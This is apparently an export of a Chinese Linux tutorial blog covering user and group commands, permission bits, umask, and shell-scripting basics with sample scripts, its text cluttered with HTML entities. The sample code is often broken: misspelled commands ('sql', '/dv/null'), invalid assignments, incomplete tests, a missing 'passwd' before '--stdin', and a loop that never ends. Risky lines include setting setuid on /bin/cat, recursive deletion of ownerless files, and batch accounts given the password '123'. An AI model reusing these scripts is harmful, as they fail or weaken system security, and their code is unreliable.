组名:密码(通常不使用):GID:逗号分隔的&#39;成员&#39;用户账号 组管理1234567891011121314sudo groupadd g_name # 添加组sudo groupdel g_name # 删除组gpasswd -a u_name g_name # 将用户加入'额外组'gpasswd -d u_name g_name # 将用户从组中删除usermod -aG g_name user # 将用户加入'额外组' a是添加,G是组 # -a 附件（否则替换）usermod -g g_name user # 修改用户的'主组' -g 把user01的主组改为IT: sudo usermod -g IT user01usermod -d /home/user2 user2 -m # 将某用户主目录内容移动到当前目录usermod -l user2 user1 # 将用户user1修改为user2(只是名称换了，其他的权限和id都不变)# 等等其他参数...... 密码策略使用足够复杂的密码Pluggable Authentication Module(PAM)123456# 安装pamapt install libpam-cracklib# vim /etc/pam.d/common-password 增加配置password required pam_pwhistory.so.remember=9 use_authok# 最近几次的密码不能相同 权限每个文件和文件夹拥有唯一的属主和属组（ls -l） 权限类型： r, w, x 读，写，执行 4, 2, 1 （这个数字是二进制转换来的，假设数组的权限为r–,对应二进制为100,转为十进制为4，其他类似） u，g，o 属主，属组，其他 1234567# 除了第一位，后面每三位一组（所有者u，所有组g，其他用户o）-rwxrwxrwx# 权限 文件 文件夹# R 读取文件内容，拷贝 列出目录内容# W 更改文件内容 创建、删除文件及文件夹# X 作为应用程序执行文件 cd进入；读取文件属性和权限 权限修改命令：chmod123456789101112131415161718192021222324252627282930313233## 只有其属主和root可以修改权限## 对文件# + - 方式chmod u+x a.txtchmod u-r a.txtchmod g-x a.txtchmod o+r a.txt# 数字方式 chmod 777 b.txtchmod 764 b.txt## 对目录(一般都给x权限，不然cd不进去)chmod u+x code/chmod u-wx code/ # 对目录：r只能看到里面的文件，要写看到属性，得加x权限# 父级目录的权限/子文件的权限# 递归修改权限chmod 770 -R code/## 权限与搜索find . -perm 770 # 搜索权限为770的文件# -type f 只搜文件； -type d 只搜目录find /path/dir/ -type f perm 664 -user xps -group xps # 属于xps组，属于xps用户，权限为664的文件find /path/dir/ -type f perm 755 -user xps -exec ls -l &#123;&#125;\; # 搜索完之后执行命令find /path/dir/ -type f perm 755 -user xps -exec chmod 770 &#123;&#125;\; # 搜索完之后再进行权限修改# 如果用户删了，并且该用户有文件没删除干净，下面找到没有所属用户的文件或文件夹find /home -nouser -exec rm -rf &#123;&#125;\; # 查找无有效属主对象，然后删除 属主与属组修改属主和属组12345678# chown需要sudosudo chown user01 a.txt # 修改a.txt的所有者为user01sudo chown -R user01 /code # 递归修改目录的所有者# 修改所有组为user01sudo chgrp user01 a.txt# 所有者和所有组都修改chown user01:user01 a.txt 特殊权限 Setuid(4)主要针对可执行程序一旦设置了suid之后：任何用户执行程序时都具备使用属主的权限设置：chmod u+s a.sh或chmod 4777 /bin/cat (前面三个二进制, 二进制为100,即4；第二种数值方式对链接不生效)比如使用passwd修改自己密码的时候修改的是shadow文件(他的属主是root)，它就是设置了s权限 如果不太懂，尽量不要随便设置suid，否则后患无穷 Setgid(2)主要针对可执行程序和目录对于程序一旦设置了sgid：任何用户执行程序时都具备使用属组的权限应用于目录时：可实现共享文件访问效果(新建文件的数组集成目录属组): 一个用户再在里面新建文件之后，一个组里的用户就都可以共享设置：chmod g+s code/或sudo chmod 2775 /bin/cat设置完之后，数组位置权限就多了s权限 stick bit(1)针对目录的受限删除位（root、属主可以删）典型例子：/tmp目录设置： chmod o+t code/加了stick位(其他用户的位置)，自己创建的文件只有自己能删除，别人无法删除 权限管理掩码决定文件和目录的默认权限 - 文件默认权限：`666`-掩码（如果掩码为002, 6-2=4，权限就为664） - 文件夹默认权限：`777`-掩码（如果掩码为002, 7-2=5，权限就为775） 命令：umask查看当前掩码修改掩码命令：umask 007（临时性的）长久修改：配置文件vi /etc/login.defs1234567# 配置其中umaskUMASK 022 # 属主的掩码0，数组的掩码2，其他用户的掩码2USERGROUPS_ENAB yes # 改为yes，属主的掩码来覆盖数组的掩码# 要想使得真正的权限与umask设置的一致：F1.可以把上面的改为noF2.设置用户账号名称和组账号名称不一样，让用户id和组id也不一样（推荐这种方式修改）sudo usermod -g users user01 # 把用户的主组改为users umask 002 用户名与组名相同、UID与GID相同 umask 027 通常设置027就行]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
        <tag>账号管理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shell脚本基本知识]]></title>
    <url>%2Fshell%E8%84%9A%E6%9C%AC%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86%2F</url>
    <content type="text"><![CDATA[应用场景 自动批量系统初始化（update，软件安装，时区设置，安全策略…） 自动化批量软件部署程序（LAMP/LNMP/Apache/LVS/Nginx) 管理应用程序（KVM，集群管理扩容，MySQL， DELLR720批量RAID） 日志分析处理日志（PV,UV, 200,!200, top 100/ grep, awk） 自动化备份恢复程序(MySQL完全/增量备份 + Crond) 自动化管理程序(批量远程修改密码，软件升级，配置更新) 自动化信息采集及监控程序（实时地收集系统/应用的状态信息:CPU,Mem,Disk,Net…） 配合zabbix信息采集（实时地收集系统/应用的状态信息:CPU,Mem,Disk,Net…） 自动化扩容（增加云主机-&gt;部署应用） Zabbix监控CPU 80% + 调用Python的api 对AWS/EC2，ESC(增加 /删除云主机)+ Shell 脚本（业务上线） 程序的组成： 逻辑 + 数据 基本用法一.常识1.输入输出重定向 1234567891011121314151617181920## 文件描述符：0，1,2 (对应：进程输入的文件，进程输入的文件，进程打开错误的文件)0表示标准输入1表示标准输出2表示标准错误输出## 输入输出重定向# &gt;, &gt;&gt;&gt; 默认为标准输出重定向，与 1&gt; 相同2&gt;&amp;1 把标准错误输出 重定向到 标准输出.&amp;&gt;a.txt 把标准输出 和 标准错误输出 都重定向到文件中# 2&gt;, 2&gt;&gt; 错误输出最佳# 2&gt;&gt;&amp;1, &amp;&gt; 描述符为2的内容输入到描述符为1的内容(&amp;&gt; 是混合输出)cat &lt; /etc/hosts #（没加任何参数） 和不加&lt;的机制不一样cat &lt; /etc/hosts &gt; test/aaa.txt # 相当于copy文件内容cat &lt;&lt; EOF # 输入内容让cat来执行cat &lt;&lt;EOF &gt; file1 # 把一会输入的文件放到文件里面去 # 混合重定向 输出到/dev/null就是什么都不显示到终端&amp;&gt; /dev/null 2.一些快捷键 123456789101112131415161718# ^R 搜索历史命令# ![number] 执行历史命令中编号为`number`的命令# ! string 找到最近一个以指定str开头的命令, 如：!da # !! 上一个命令（在脚本中是不能手动按方向键的）# !$ shell上一个命令的最后一个参数，比如：ls aaa/bb /etc/passwd, 再执行： head !$, 看到是的passwd的内容# ^D 退出# ^A 跳到最前# ^E 跳到最后# ^K 向后删除# ^U 向前 删除# ^Y 撤销# ^L# ^S 锁屏暂停# ^Q 恢复 3.在bash程序中嵌入一个python代码 12345678910111213141516#!/bin/bash# 第一行不是注释， 声明用哪个解释器 #!ping -c1 114.114.114.114 &amp;&amp; echo "114.114.114.114 is up" || echo "114.114.114.114 id down"# &lt;&lt;-DOF：EOF是开始结束的标识（小横杠代表以下按tab,下面的py代码可以不tab缩进), EOF是不成文的规范# 整个程序还是使用bash解释器，只不过是中间"请来一个人 - python"# 如下：/usr/bin/python3 &lt;&lt;-EOFprint("hello py")EOFecho "hello bash"# 在bash中调用 python： expect# 如果在python中使用bash， 要调用os.system('系统命令') 没有-的话，EOF作为结束符，前面不能有任何tab制表符。有-的话，EOF作为结束符，前面可以有tab制表符,容错率更高一点。 4.配合figlet打印菜单: 1234567891011#!/bin/bashcat &lt;&lt;EOF+-----------------------------------------------------+| _ || _ __ ___ __ _ _ __ _ _ __ _| | || | '_ \` _ \ / _\` | '_ \| | ||/ _\` | | || | | | | | | (_| | | | | |_| |(_| | | || |_| |_| |_|\__,_|_||_|\__,_|\__,_|_| || |+-----------------------------------------------------+EOF 5.子shell 1234567891011121314#!/bin/bashcd ~/Desktopls# 这种做法，在终端执行完毕之后，当前目录还是没有变，因为他是在subshell （子shell中执行的）# 要想使得subshell中的生效，就要使用`.` 或者 `source`####### 执行脚本./01.sh # 需要执行权限，在子shell中执行bash 01.sh # 不需要执行权限，在子shell中执行01.sh # 需要执行权限，在当前shell中执行source 01.sh # 不需要执行权限，在当前shell中执行 6.shell元字符 通配符, 注意区分与正则中的元字符 123456789101112131415161718192021222324252627282930313233#！/bin/bash # * 任意多个字符 ls /etc/net*# ? 任意一个字符 ls home/xp?# [] 匹配括号内任意一个字符 [abc][a-z] [^a-zA-Z0-9] # ^取反 l[io]ve l[^a-z]ve # () 命令在子shell中执行 (umask 077; touch test.txt) # 不影响创建文件的权限，当前shell的umask也没有改变 # ----- 回顾，子shell： .test.sh, source x.sh# &#123;&#125; 集合 touch &#123;1..9&#125; mkdir /home/&#123;111,222&#125; mkdir -pv /home/&#123;333,&#123;aaa,bbb&#125;, 444&#125;cp -rv /etc/&#123;passwd, passwd.old&#125; # 前面的相同的路径可以写在一块，后面不同的&#123;&#125;起来cp -rv /etc/passwd&#123;,.old&#125; # 前面的相同的路径可以写在一块，后面不同的&#123;&#125;起来# \ 转义符 让元字符回归本意 echo \* echo \\ echo \ #后面紧跟回车，也就转义了回车# -e 常规字符转变为特殊意义的：echo -e "a\tb\nc" 7.前台后台 123456789101112131415161718192021222324252627282930313233343536373839#!/bin/bash## &amp; (关闭xshell，对应的任务也跟着停止)sh test.sh &amp; ## nohub #任务放到后台，关闭标准输入，终端不再能够接收任何输入（标准输入）,重定向标准输出和标准错误到nohup.out中nohup sh test.sh ## 区分`nohub`与`&amp;`:1.&amp; 是指在后台运行，但当用户推出(挂起)的时候，命令自动也跟着退出2.nohub 退出终端之后该进程还是有的## nohub与&amp;合体#将sh test.sh任务放到后台，但是依然可以使用标准输入，终端能够接收任何输入，重定向标准输出和标准错误到当前目录下的nohup.out文件，即使关闭xshell退出当前session依然继续运行。nohup sh test.sh &amp; ## screen apt install screen # 安装`sleep 100000` # 先执行,然后退出终端，`screen -list` # 再次打开终端,指定这个命令，看到id`screen -r yourID` # 然后输入这个命令,一切就回来了## shell的会话作业机制ctrl +c # 杀掉的是前台进程# ^Z 放到后台， fg 调回来kill %3 # 给当前终端作业号为3的发信号## jobs 查看作业## 管道 |# tee 管道, -a 最佳date | tee -a date.txt # 输出到文件，同时截流（能在终端直观地看到）## 技巧: vim里面写脚本，可以按^Z暂停，到终端敲命令，让fg返回继续 8.命令排序 ; 不具备逻辑排序 （前面执行完毕就执行后面的，不管前面成功失败与否） &amp;&amp; 前面执行成功(即返回值$?为0)就执行后面的 || 前面执行失败(即返回值$?为不为0)就执行后面的 相当于 if else 9.echo颜色输出 使用场景：给用户醒目提示 1234567891011121314151617181920212223242526#!/bin/bash# -e 才可以# \e[1;3x # \e[1;3x 前景色(30-37),m后面是文字 echo -e "\e[1;31mThis is a red"echo -e "\e[1;33mThis is a yellow"# 0m 恢复颜色echo -e "\e[1;0m"echo -e "no color"## 常用： 前面变色之后， 后面紧跟：\e[0m 不变色(后面的内容就正常了)echo -e "\e[1;31mThis is a red text. \e[0m"echo -e "no color again"## 背景色(40-47)echo -e "\e[1;41mThis is a red text background coloe. \e[0m"echo -e "\e[1;42mThis is a red text background coloe. \e[0m"echo -e "\e[1;43mThis is a red text background coloe. \e[0m"echo -e "\e[1;44mThis is a red text background coloe. \e[0m"echo -e "\e[1;45mThis is a red text background coloe. \e[0m"# printf 也是，不过是加了输出格式 10.切换用户 123# 切换用户尽量加 -su - xxx # 加横线， shell的环境也跟随改变 （login shell） ； 执行的是前四个: bashrc和profilesu xxx # 不加横线，当前环境还是当前的 () ； 执行的是两个bashrc文件 11.关于bash的文件 123456789101112131415161718192021## 关于bash的文件：# 系统级别 来到shell时候执行/etc/profile/etc/bashrc# 用户级别 来到shell时候执行~/.bashrc~/.profile# 离开shell时候执行~/.bash_logout~/.bash_history# 修改用户的shellusermod -s /bin/bash xps # 下面两个# login shell# nologin shell# /bin/bash# /sbin/nologin 12.其他 12345678# shift 使位置参数向左移动，默认移动1位，可以使用shift2while [ $# -ne 0 ]do let sum+=$i shift # shift 2doneecho "$sum" 二.变量位置变量1234567891011脚本执行时，后面的第几个参数 $1 后面第一个参数 $2 $3 $&#123;10&#125;## 比如下面的例子;# bash test.sh 111 222 333ping -c1 $1 &amp;&gt;/dev/nullif [ $? -eq 0 ] # 如果`上一条命令`返回值等于0(正常执行) -eqthen echo "$1 is up"else echo "$1 is down"fi 预定义变量1234567$0 # 脚本名$* # 所有的参数$@ # 所有的参数$# # 参数的个数$$ # 当前进程的PID echo $$$! # 上一个`后台`进程的PID$? # 上一个命令的返回值（0为成功） ping 文件 12345# 如果用户没有加参数if [ $# -eq 0 ];then echo "usage: file `basename $0` need parmter" exitfi 如果是文件 -f 12345678910111213141516171819202122# 第一个参数如果不是文件if [ ! -f $1 ];then echo "not a file" exitfi### 第一个参数是文件，从中读取ip然后pingfor ip in `cat $1`do ping -c1 ip $&gt;/dev/null if [ $? -eq 0 ];then echo "$ip is up" else echo "$ip is down" fidone### basename 始终显示路径最后一个文件# dirname 始终显示路径前面目录的名字 环境变量export 123456789101112131415161718## 在系统配置中用的多# 例如：自己添加环境变量：到/etc/profilePATH=$PATH:/new/binexport PATH# 然后sourcess# 查看环境变量echo $PATHecho UIDecho $SHELLecho $USERecho $HISTORY #历史记录命令默认记录1000条# 显示所有的环境变量： env# 取消环境变量： unset 变量名 自定义变量作用范围：当前shell中生效(a.sh或bash a.sh)， 子shell中不行 1234567## 转为环境变量 export (在一个脚本文件中export， 在另一个脚本中就可以获取了)export ip1## ps: 自己没必要定义环境变量F1: 先 .test.sh 再echo $ip1F2: 或者在一个脚本中引用加载另外一个脚本(./test.sh)，后面就可以用了（没必要在每个文件中都定义一遍变量） 变量的赋值1.显式赋值 （变量要以字母或者下划线开头，数字不可以开头） 12345## 常规赋值# shell中没有数据类型，都是字符串## 命令替换, 先把这个命令执行一遍再赋值: 反引号 ` `, $()today = `date + %F` 2.read读取赋值 12345678910111213141516 ## -p提示信息。-t等待时间。-n只要前面几个字符 # read -p "提示信息： " 变量名# read -t 5 -p "提示信息： " 变量名# read -n 2 变量名# read 可以同时跟多个变量。空格隔开，直接一次性赋值read -p "输入姓名，年龄，性别[e.g zhangsan 20 m]： " name age genderecho "your name: $name, your age $age, your gender $gender"### 注意事项："" # 弱引用(里面可以放变量$ip)'' # 强引用（里面不能引用变量,会原样输出）### 命令替换： `` 等价于 $(), 里面的命令会先执行 使用变量 变量赋值，等号两边不能有空格 1ping -c1 $ip &amp;&gt;/dev/null &amp;&amp; echo "$ip is up" || echo "$ip is down" 变量引用123## 引用1. $变量2. $&#123;变量&#125; # 大括号简单理解为：防止歧义 变量的运算 使用场景：内存使用, ping次数等 … … 12345678910111213141516171819202122232425262728293031## 1.整数运算 90%以上# 方法1： expr + - \* / %expr 1+2expr $num1 + $num2# 方法2： $(()) + - * / % echo $(($num1+$num2))echo $((num1+num2))echo $((5-3*2))echo $(((5-3)*2))echo $(((2**3))echo $(((1+2));echo $sum# 方法3： $[] + - * / %echo $[5+2] echo $[5**2]# 方法4： let 使用最多let sum=2+3;echo $sumlet i++;echo $i## 2.小数运算echo "2*4"|bcecho "2^4"|bcecho "scale=2;6/4"|bcawk 'BEGIN&#123;print 1/2&#125;'echo "print 5.0/2"|python 变量的删除/替换 使用场景：让你输入值但是你没输入，我就给你一个默认值 1234567891011121314151617181920212223242526272829303132333435363738394041424344### 删除url="www.baidu.com"echo $&#123;#url&#125; # 从前往后，井号，输出长度， 最短匹配echo $&#123;url#www.&#125; # 把前面部分删除echo $&#123;url#*baidu.&#125; # 把前面部分删除 * echo $&#123;url##*.&#125; # 从前往后，贪婪匹配，最长匹配echo $&#123;url%.&#125; # 从后往前, 最短匹配echo $&#123;url%%.&#125; # 从后往前，贪婪匹配### 切片echo $&#123;url：0:5&#125; # echo $&#123;url：5:5&#125; # 从5开始，拿5个echo $&#123;url：5:&#125;### 变量内容的替换url="www.baidu.com"echo $&#123;url/baidu/sina&#125; # 百度换成新浪echo $&#123;url/n/N&#125;echo $&#123;url//n/N&#125; # 贪婪匹配## $&#123;变量名-新变量值&#125;# 替代(没赋值；如果变量之前有值即便是空值就不能替代) unset var1echo $&#123;var1-aaa&#125;## $&#123;变量名:-新变量值&#125;# 没赋值或者为空，就可以替代；如果变量之前有值就不能替代### 拓展：$&#123;变量名+新变量值&#125;$&#123;变量名:+新变量值&#125;$&#123;变量名=新变量值&#125;$&#123;变量名:=新变量值&#125;$&#123;变量名?新变量值&#125;$&#123;变量名:?新变量值&#125;#### 自增自减# i++# ++i## 对变量值的影响： 没啥区别## 对表达式值的影响： ++i 先自增再赋值， i++ 先赋值在自增 三.条件判断if shell中最核心的 1.文件测试 [操作符 + 文件或目录] 命令格式1：test 1234567# 比如判断文件是否存在，如果存在就备份(概念版)back_dir=/var/mysql_bakif ! test -d $back_dir;then # 条件测试语句test， 如果不是目录或者这个目录不存在 mkdir -p $back_dirfiecho "开始备份..."# 执行 bash -vx test.sh -vx可以看详细执行过程 命令格式2： [ -d /home ] 方括号取代了test(注意有空格) 123456# man test， 帮助文档相同。 前半边是命令[, 后半边]只是一个符号back_dir=/var/mysql_bakif [ ! -d $back_dir ];then # 如果不是目录或者这个目录不存在 mkdir -p $back_dirfiecho "开始备份..." 命令格式3： [[ -d /home ]] 123456789101112# [ -e dir|file ]-d 是否是目录-f 是否为文件-r `当前用户`是否对该文件有读权限-w-l 是否是链接-b 是否为设备文件-c 是否为字符设备#[ ! -d /cc ] &amp;&amp; mkdir /cc # 当前不是一个目录或者目录如果不存在，就创建[ -d /ccc ] || mkdir /ccc # 当前是一个目录或者目录如果存在，就不创建 2.数值比较 123456# [ 1 -gt 10 ] 大于-lt 小于-eq 等于-ne 不等于-ge &gt;=-le &lt;= 123456#安装软件，先判断是否为root用户if [ $UID -ne 0 ];then # $UID不等于0，代表不是root用户(数值比较) echo "你没有权限!" exitfiapt install apache2 例子：用户输入(read)用户名，创建这个用户 12345678910read -p "input the user name: " userid $user &amp;&gt;/dev/nullif [ $? -eq 0 ];then # 如果用户存在 echo "user $user already exists"else useradd $user if [ $? -eq 0 ];then echo "$user is created." fifi 例子2： 如果磁盘是使用量超过90%， 就报警 12345678910111213141516# grep'/$' 是提取根分区， $(NF) 是倒数第一列， awk是以什么分割dick_use=`df -Th |grep'/$'|awk '&#123;print $(NF-1)&#125;'|awk -F"%" '&#123;print $1&#125;'`mail_user=alicewarn_file=/tmp/disk_warn.txtif [ $dick_use -gt 90 ];then echo "`date +%F:%H` disk: $&#123;dick_use&#125;%" &gt;warn_filefiif [ -f $disk_warn ];then # 将报错文件发送给邮件用户 mail -s "disk warning..." $mail_user &lt; $dick_use # |mail -s 邮件主题 rm -rf $disk_warnfi# 可以用crontab，定时执行（crontab -e会把所有的任务清除）# 换行是 \ 3.字符串比较 123456789===!=[ -n "hhh" ] # 长度不是0[ -z "$user" ] # 长度为0 (变量为空/未定义 =&gt; 都是0)-a # 并且 [1 -lt 1 -a 5 -gt 10]-r # 或者&amp;&amp;|| 12345if [ $USER != 'root' ];then # $USER不等于root(字符串比较) echo "你没有权限!" exitfiapt install apache2 例子：批量创建用户 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#尽量使用双引号引起来#[ "$USER" = "root" ]#!/bin/bash###################################脚本规范 ##useradd ##V1.0 by xps 01/03/2020 ###################################read -p "Please input number: " num# read -p "Please input 前缀: " prefixwhile truedo # 对用户输入进行过滤（数字） ^[0-9]+$ 正则 =~ (模式串不能带双引号) #if [[ ! "$num" =~ ^[0-9]+$ || "$num" =~ ^0+$ ]];then # []单个方括号不支持正则，用[[ 变量 =~ 模式 ]] if [[ "$num" =~ ^[0-9]+$ ]];then break else read -p "不是数字，Please input number again: " num fi doneread -p "Please input 前缀: " prefixwhile truedo if [ -n "$prefix" ];then # 如果长度为非0 break else read -p "Please input 前缀: " prefix fidone# man seq 打印序列： seq 1 2 10 (区间，步长)for i in `sql $num`do user=$prefix$i useradd $user echo "123" |passwd --stdin $user # --stdin 前面输出的当做标准输入 if [ $? -eq 0 ];then echo "$user is created." fidone# declare 可以定义数据类型。但是一般不用，因为都是字符串## 语法不难，主要是对Linux系统以及命令的熟悉。 123456789# if后门紧跟的不一定是方括号，只要是能返回true/false的就行if [[ condition ]]; then #statementselif [[ condition ]]; then #statementselif [[ condition ]]; then #statementsfi switch语法结构 12345678910111213case 变量 in模式1) # 都是字符串， 可以用通配符 (尽量使用双引号) 命令序列1 ;;模式2) 命令序列2 ;;模式3) 命令序列3 ;;*) 无匹配后命令序列esac 例子1：删除用户 12345678910111213141516read -p "请输入要删除的用户名： " userid $user &amp;&gt;/dev/nullif [ &amp;? -ne 0 ];then echo "no suc user: $user" exit 1 # 返回1（意思是错误退出）firead -p "你确定要删除用户: $user 吗 ?[y/n]: " actioncase "$action" iny|Y|yes|YES) userdel -r $user echo "deleted user: $user success!" ;;*) echo "error"esac 例子2： 判断一个东西是不是命令 1234567891011# command -v xxx# echo $? 返回为0就是command -v lscmd1=/bin/dateif command -v $cmd1 &amp;&gt;/dev/null;then # 神马都不做： 只加一个冒号 :else echo "$cmd1 是一个命令"fi 例子3：通过登录堡垒机/跳板机 jumpserver ，然后登录内网的服务器 （简易版） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253# 1.先登录到跳板机(普通账号)# 2.跳板机登录到other server（）# 登录两次，有点麻烦# 例子： 先登录到跳板机，再通过选项选择要登录到哪台服务器（1.密码认证 2.秘钥认证:以用户xps身份做 ssh-keygen, ssh-copy-id web1）# 以xps身份登录上来， 秘钥登录服务器# 脚本放到/home/xps/jumpserver.sh, 放到bashrc，登录这台机器就执行，并且禁止用户(^C)退出trap "" HUP INT OUIT TSTP # 捕捉键盘信号，然后啥也不做(^C也退出不了) ,让他登录跳板机不能干别的web1=192.168.0.111web2=192.168.0.112web3=192.168.0.113cat &lt;&lt;-EOF+---------------------------+| 1. web1 || 2. web2 || 3. mysql1 |+---------------------------+EOFecho -en "\e[1;32minput number: \e[0m" # 显示颜色, -n不换行read numwhile truedo case "$num" in 1) ssh xps@$web1 ;; 2) ssh xps@$web2 ;; 3) ssh xps@$mysql1 ;; "") # 用户啥也没输入 true *） echo "error" esacdone## 生产环境#1. 业务服务器不允许直接连接，允许通过跳板机连接#2. 业务服务器不允许root用户直接登录### 复杂版jumpserver(对用户行为进行行为/记录) ---&gt; 使用Python脚本 例子4：实现系统管理工具箱 123456789101112131415161718192021222324252627282930313233#!/bin/bash## 实现系统管理工具箱# 定义一个函数menu&#123; cat &lt;&lt;-EOF ########################################## # h. help # # f. disk partion # # d. filesystem mount # # m. memory # # u. system load # # q .exit # ########################################## EOF&#125;menuwhile truedo read -p "Please input[h for help]: " action case "$action" in h) clear; menu;; f) fdisk -l;; d) df -Th;; m) free -m;; u) uptime;; q) break;; "") ;; *) echo "error";; esacdoneecho "finish..." 各种符号123456789101112131415161718192021222324252627#!/bin/bash() # 在子shell中执行((1&lt;2)) # C语言风格的比较$(date) # touch $(date +%F)_file.txt 先执行里面的命令再执行外面的$(()) # 运算&#123;&#125; # 集合&#123;1..5&#125;$&#123;&#125; # 变量的引用[] # 条件测试 逻辑符号 [ a -a b ][[]] # 升级版的。 支持正则匹配 [[ =~ ]]， 逻辑符号 [[ a &amp;&amp; b ]]$[] # 整数运算####### 执行脚本./01.sh # 需要执行权限，在子shell中执行bash 01.sh # 不需要执行权限，在子shell中执行01.sh # 需要执行权限，在当前shell中执行source 01.sh # 不需要执行权限，在当前shell中执行###### 调试脚本sh -n 02.sh # 仅调试syntax errorsh -vx 02.sh # 仅调试的方式执行，查询整个执行过程 四.循环for循环 处理固定循环的时候，for有优势 形式 1234for 变量名 [ in 列表 ]do 循环体done 拓展： 查看脚本运行时间: time ./a.sh 例子1： for循环ping机器 123456789101112131415# 重定向&gt;ip.txt# &#123;2..254&#125; 集合， 另一个序列: seq `2 254`for i in &#123;2..254&#125;do &#123; $ip = 192.168.111.$i ping -c1 -W1 $ip &amp;&gt;/dev/null # -W等待多少时间 if [ $? -eq 0 ]; then echo "$ip" | tee -a ping.txt fi &#125;&amp; # 用大括号和&amp;, 把整个循环【放到后台】donewait # 等待前面的所有【后台】进程结束，再执行后面的echo "finish !" 例子2：从文件中读取主机，然后ping 123456789101112# &#123;2..254&#125; 集合， 另一个序列: seq `2 254`for ip in `cat ips.txt`do ping -c1 -W1 $ip &amp;&gt;/dev/null # -W等待多少时间 if [ $? -eq 0 ]; then echo "$ip is up!" else echo "$ip is down!" fidonewait # 等待前面的所有【后台】进程结束，再执行后门的echo "finish !" 例子3：批量创建账号 12345678910111213141516171819202122232425262728293031323334while :do read -p "input your prefix &amp; passwd &amp; number : " prefix passwd number printf "user information: --------------------------- username: $passwd prefix: $prefix number: $number --------------------------- " read -p "Are you sure?[y/n]" action if [ "$action" = "y" ];then break fidoneecho "continue ..."# 然后是接下来的功能for i in `seq -w $number`do user = $prefix%i id $user &amp;&gt;/dv/null if [ $? -eq ];then echo "user $user already exists" else useradd $user echo "$passwd" | --stdin $user # 将密码作为标准输入 if [ $? -eq 0 ];then echo "$user is created." fi fi done# bash -n .sh 检查脚本错误 例子4：批量创建账号（从文件中） 1234567891011121314151617181920212223242526272829303132333435passwd = 123# 必须要输入文件if [ $# -eq 0 ];then echo "usage: `basename $0` file" exitfi# 判断输入的是否是文件if [ ! -f $1 ];then echo "error file" exit 2fi# 开始(两列 -- &gt; 把密码和用户名分开)# 应该：重新定义分隔符# IFS内部字段分隔符,比如下面的回车# IFS = $'\n' for line in `cat $1` # 位置变量 , for对空行不感冒do # 长度为0就跳过 if $[ $&#123;#line&#125; -eq 0 ];then echo "Nothing to do." continue fi user = `echo "$line" |awk 'print &amp;1'` pass = `echo "$line" |awk 'print &amp;2'` id $user &amp;&gt;/dv/null if [ $? -eq ];then echo "user $user already exists" else useradd $user echo "$pass" | --stdin $user &amp;&gt;/dev/null # 将密码作为标准输入 if [ $? -eq 0 ];then echo "$user is created." fi fi done 例子5：批量修改密码(剩下的功能自己完善) 1234567891011121314151617181920# 目前：通的放一个文件，不通的放一个文件for ip in $(cat ip.txt)do &#123; ping -c1 -W1 $ip &amp;&gt;/dev/null if [ $? -eq 0 ];then ssh $ip echo "123" |passwd --stdin $user # 采用的公钥认证 if [ $? -eq 0 ];then echo "$ip" &gt;&gt;success_`date + %F`.txt else echo "$ip" &gt;&gt;failed_`date + %F`.txt fi else echo "$ip" &gt;&gt;failed_`date + %F`.txt fi &#125;&amp;donewaitecho "end!" 例子6：批量修改主机ssh设置 1ssh $ip "sed -ri '/~#UseDNS/cUseDNS0 no' /etc/ssd/sshd_config" # 搜索并替换(c) while循环 逐行读取文件的时候，while有优势 不用像for循环那样担心每一行的空格空行 所以：读取一个文件中逐行处理，while比for好用 例子1：创建用户 12345678910111213141516171819202122# 以后，读取一个文件中逐行处理，while比for好用while read line:do # 判断用户数是否输入参数 if [ $&#123;#line&#125; -eq 0 ];then continue fi user = `echo $line|awk '&#123;printf $1&#125;'` pass = `echo $line|awk '&#123;printf $2&#125;'` id $user &amp;&gt;/dev/null if [ $? -eq 0 ];then echo "user $user already exists" else useradd $user echo "$pass" | --stdin $user &amp;&gt;/dev/null # 将密码作为标准输入 if [ $? -eq 0 ];then echo "$user is created." fi fidone &lt; $1 # 可以换成位置变量, 从文件里面读取用户名(read不用-p了)# done &lt; user.tx # 例子2：while实现连接测试 123456# 只要ping通就一直ping（【条件为true时候一直执行循环】）ip=192.168.0.5while ping -c1 -W1 $ip &amp;&gt;/dev/null; do sleep 1doneecho "$ip is down!" 例子3：until 实现连接测试 12345ip=192.168.0.5until ping -c1 -W1 $ip &amp;&gt;/dev/null; do sleep 1doneecho "$ip is up!" while 适合写主机下线 until 适合写主机上线 until循环形式 12345# 当条件测试为false时候执行循环体until 条件测试do 循环体done 例子1：until实现数值运算 1234567# i=1until [ $i -gt 100 ] # &gt;100do let sum+=$i let i++doneecho "sum: $sum" 例子2：while实现数值运算 1234567#数值运算：leti=1while [ $i -le 100 ] # &lt;=100do let sum+=$idoneecho "sum: $sum" 并发 并发 —&gt; 多进程 之前写的传统并发的方式，多进程（返回是时间是乱序的） 缺点：有些并发数量太多，会报错 格式: 123456...&#123; ...&#125;&amp;wait... 比如： 1234567891011121314for i in &#123;1..254&#125;do &#123; ip=192.168.0.$i ping -c1 -W1 $ip &amp;&gt;/dev/null if [ $? -eq 0 ];then echo "$ip is up." else echo "$ip is down." fi &#125;&amp;donewaitecho "执行结束..." 控制并发的数量 1234567891011121314151617181920212223### 1). FD(File Descriptors)文件描述符 或 文件句柄 # 进程使用文件描述符来管理打开的文件（位置： /proc/进程id/fd/）# $$是当前进程exec 6&lt;&gt; /file1 # 1.手动指定描述符来 打开文件echo "111" &gt;&gt; /proc/$$/fd/6 # 2.写入到了file1# 3.删除file1# 4.然后查看文件句柄:ll /proc/$$/fd# 会发现6显示删除状态## 5.把6这个文件拷贝出来变成file1,就又回来了（如果文件句柄没有删除或关闭。就算原文件被删除了，句柄依然在）ls of # 6.列出打开的文件exec 6&lt;&amp;- # 7.释放文件的句柄 ### 2). 管道## 匿名管道(一个终端内使用) |## 跨终端使用 mkfifomkfifo /tmp/fifo1 # 创建ll /dev &gt; /tmp/fifo1 # 把dev重定向到管道中，另一个终端就可以用了# 另一个终端使用： grep 'sda' /tmp/fifo1 例子： 1234567891011121314151617181920212223242526272829thread=5tmp_fifofile=/tmp/$$.fifomkfifo $tmp_fifofileexec 8&lt;&gt; $tmp_fifofilerm $tmp_fifofilefor i in `seq $thread`do echo &gt;&amp;8 # 操作的是文件描述符（）donefor i in &#123;1..254&#125;do read -u 8 # -u 是读取文件描述符内容（逐行） &#123; ip=192.168.0.$i ping -c1 -W1 $ip &amp;&gt;/dev/null if [ $? -eq 0 